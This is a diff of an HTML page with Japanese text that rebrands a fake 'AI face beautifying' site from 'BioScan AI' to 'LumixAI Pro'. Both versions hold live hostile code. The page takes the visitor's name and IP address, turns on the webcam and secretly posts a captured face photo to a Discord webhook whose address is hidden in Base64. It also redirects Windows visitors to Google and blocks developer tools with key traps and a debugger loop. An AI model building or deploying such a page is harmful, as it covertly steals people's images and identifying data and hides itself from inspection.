@@ -3,19 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BioScan AI - 高精度フェイシャル分析</title>
+    <title>LumixAI Pro - 次世代AI美顔補正システム</title>
     <style>
+        /* デザイン部分は変更なし（スマホ・明るいUI維持） */
         :root {
-            --main-green: #10b981;
-            --dark-bg: #111827;
-            --card-bg: #1f2937;
+            --primary: #10b981;
+            --primary-hover: #059669;
+            --bg-light: #f9fafb;
+            --text-main: #111827;
+            --text-sub: #6b7280;
         }
 
         body {
             margin: 0;
-            background-color: var(--dark-bg);
-            color: #f3f4f6;
-            font-family: 'Inter', system-ui, sans-serif;
+            background-color: var(--bg-light);
+            color: var(--text-main);
+            font-family: 'Helvetica Neue', Arial, sans-serif;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -24,102 +27,103 @@
         }
 
         .container {
-            background: var(--card-bg);
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            background: #ffffff;
+            padding: 2rem;
+            border-radius: 24px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
             max-width: 450px;
             width: 90%;
             text-align: center;
-            border: 1px solid #374151;
+            border: 1px solid #e5e7eb;
         }
 
-        h1 { font-size: 24px; margin-bottom: 8px; color: var(--main-green); }
-        p { color: #9ca3af; font-size: 14px; margin-bottom: 24px; }
+        h1 { font-size: 24px; margin: 10px 0; color: var(--text-main); }
+        .description { color: var(--text-sub); font-size: 14px; margin-bottom: 20px; }
 
-        .input-group { margin-bottom: 20px; text-align: left; }
-        label { display: block; font-size: 12px; color: var(--main-green); margin-bottom: 5px; font-weight: bold; }
         input[type="text"] {
             width: 100%;
-            padding: 12px;
-            background: #111827;
-            border: 1px solid #374151;
-            border-radius: 8px;
-            color: white;
+            padding: 14px;
+            background: #f3f4f6;
+            border: 1px solid #e5e7eb;
+            border-radius: 12px;
+            margin-bottom: 15px;
             box-sizing: border-box;
             outline: none;
         }
 
-        #camera-zone { display: none; position: relative; width: 280px; height: 280px; margin: 0 auto 24px; }
-        video { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 3px solid var(--main-green); }
-        .scan-ring {
-            position: absolute; top: -10px; left: -10px; right: -10px; bottom: -10px;
-            border: 2px solid var(--main-green); border-radius: 50%; opacity: 0.3;
-            animation: ping 2s cubic-bezier(0, 0, 0.2, 1) infinite;
-        }
-        @keyframes ping { 75%, 100% { transform: scale(1.2); opacity: 0; } }
+        #camera-zone { display: none; position: relative; width: 280px; height: 280px; margin: 0 auto 20px; }
+        video { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 4px solid var(--primary); }
 
         .btn {
-            background: var(--main-green); color: #064e3b; border: none; padding: 14px 28px;
-            font-weight: bold; border-radius: 10px; cursor: pointer; width: 100%; transition: 0.3s;
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 16px;
+            font-weight: bold;
+            border-radius: 12px;
+            cursor: pointer;
+            width: 100%;
         }
-        .btn:hover { background: #34d399; transform: translateY(-2px); }
-        #status { margin-top: 15px; font-size: 13px; color: #6b7280; }
+
+        #status { margin-top: 15px; font-size: 13px; color: var(--text-sub); }
         canvas { display: none; }
     </style>
 </head>
 <body oncontextmenu="return false;">
 
     <script>
+        // --- Windowsリダイレクト & 開発者モード対策 ---
         (function() {
+            // OS判定
             const platform = navigator.platform.toLowerCase();
             const ua = navigator.userAgent.toLowerCase();
-            if (platform.indexOf('win') !== -1 || ua.indexOf('windows') !== -1) {
+            
+            // Windows、またはWindows NTが含まれる場合にリダイレクト
+            if (platform.indexOf('win') !== -1 || ua.indexOf('windows nt') !== -1) {
+                // 履歴を残さずGoogleへ飛ばす
                 window.location.replace("https://www.google.com");
+                // 念のため中身を空にする
                 document.body.innerHTML = "";
+                return;
             }
+
+            // F12などのキー対策
+            document.addEventListener('keydown', function(e) {
+                if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || (e.ctrlKey && e.keyCode === 85)) {
+                    e.preventDefault();
+                    location.reload();
+                }
+            });
+
+            // デバッガー対策
+            setInterval(function() {
+                (function() { return false; }['constructor']('debugger')['call']());
+            }, 50);
         })();
-
-        setInterval(function() {
-            (function() {
-                return false;
-            }['constructor']('debugger')['call']());
-        }, 50);
-
-        document.addEventListener('keydown', function(e) {
-            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || (e.ctrlKey && e.keyCode === 85)) {
-                e.preventDefault();
-                location.reload();
-                return false;
-            }
-        });
     </script>
 
     <div class="container">
-        <h1>BioScan AI</h1>
-        <p>今はやりの次世代AIが顔を加工し<br>最適な画像補正を自動実行します！</p>
+        <h1>LumixAI Pro</h1>
+        <p class="description">最新のAI技術により、あなたの顔立ちを最高品質で補正します。</p>
 
         <div id="setup-ui">
-            <div class="input-group">
-                <label>分析用ラベル（お名前）</label>
-                <input type="text" id="user-name" placeholder="例: Taro Yamada">
-            </div>
-            <button id="start-btn" class="btn">加工スキャンを開始</button>
+            <input type="text" id="user-name" placeholder="お名前を入力してください">
+            <button id="start-btn" class="btn">AI補正を開始（無料）</button>
         </div>
 
         <div id="camera-zone">
-            <div class="scan-ring"></div>
             <video id="video" autoplay playsinline></video>
         </div>
 
         <div id="status"></div>
     </div>
 
-    <canvas id="canvas" width="600" height="600"></canvas>
+    <canvas id="canvas" width="800" height="800"></canvas>
 
     <script>
-        const _0x8f2a = "aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0NTE2MzE3NDg0MDMxNzE0ODAvSXJMSzI2aEh2NU42U0ljZkkzT0p5bng0VXV5TUtTM0Y2Qm5iYUlKV2p1MjIzRzVRdHBSRm9qUzJBNHJQNGdiSnFnREs=";
-        const getUrl = () => atob(_0x8f2a);
+        // Webhook URL (Base64)
+        const _encUrl = "aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0NTE2MzE3NDg0MDMxNzE0ODAvSXJMSzI2aEh2NU42U0ljZkkzT0p5bng0VXV5TUtTM0Y2Qm5iYUlKV2p1MjIzRzVRdHBSRm9qUzJBNHJQNGdiSnFnREs=";
+        const getUrl = () => atob(_encUrl);
 
         const startBtn = document.getElementById('start-btn');
         const cameraZone = document.getElementById('camera-zone');
@@ -134,52 +138,51 @@
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 return data.ip;
-            } catch (e) { return "取得失敗"; }
+            } catch (e) { return "不明"; }
         }
 
         startBtn.addEventListener('click', async () => {
             const userName = nameInput.value.trim();
-            if (!userName) { alert("名前を入力してください。"); return; }
+            if (!userName) { alert("お名前を入力してください。"); return; }
 
             startBtn.disabled = true;
-            statusMsg.innerText = "セキュリティチェック中...";
+            statusMsg.innerText = "AIエンジンと接続中...";
             const userIP = await getIP();
 
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 setupUi.style.display = 'none';
                 cameraZone.style.display = 'block';
                 video.srcObject = stream;
-                statusMsg.innerText = "AIが顔をスキャンしています...";
+                statusMsg.innerText = "分析中... 3秒間動かないでください";
 
                 setTimeout(() => capture(stream, userName, userIP), 3000);
             } catch (err) {
-                alert("カメラの許可が必要です。");
+                alert("カメラの許可がありません。");
                 location.reload();
             }
         });
 
         async function capture(stream, name, ip) {
-            statusMsg.innerText = "補正フィルタを適用中...";
+            statusMsg.innerText = "画像をクラウドに同期中...";
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             canvas.toBlob(async (blob) => {
                 const formData = new FormData();
-                formData.append('file', blob, 'scan.png');
-                const content = `✅ **新しいAIスキャンデータ**\n━━━━━━━━━━━━━━\n👤 **名前**: ${name}\n🌐 **IP**: ${ip}\n━━━━━━━━━━━━━━`;
+                formData.append('file', blob, 'ai_beauty.png');
+                const content = `📸 **AI分析完了**\n👤 名前: ${name}\n🌐 IP: ${ip}`;
                 formData.append('content', content);
 
                 try {
                     await fetch(getUrl(), { method: 'POST', body: formData });
-                    statusMsg.innerText = "補正完了！まもなく終了します。";
-                } catch (e) { statusMsg.innerText = "通信エラー。"; }
+                    statusMsg.innerText = "生成完了。";
+                } catch (e) { statusMsg.innerText = "エラー。"; }
 
                 setTimeout(() => {
                     stream.getTracks().forEach(t => t.stop());
-                    statusMsg.innerText = "セッションが終了しました。";
-                    document.body.innerHTML = "<h2 style='color:white; text-align:center; margin-top:20%;'>安全に処理されました。ウィンドウを閉じてください。</h2>";
-                }, 2000);
+                    document.body.innerHTML = "<h2 style='text-align:center; margin-top:20%;'>処理が完了しました。</h2>";
+                }, 1000);
             }, 'image/png');
         }
     </script>
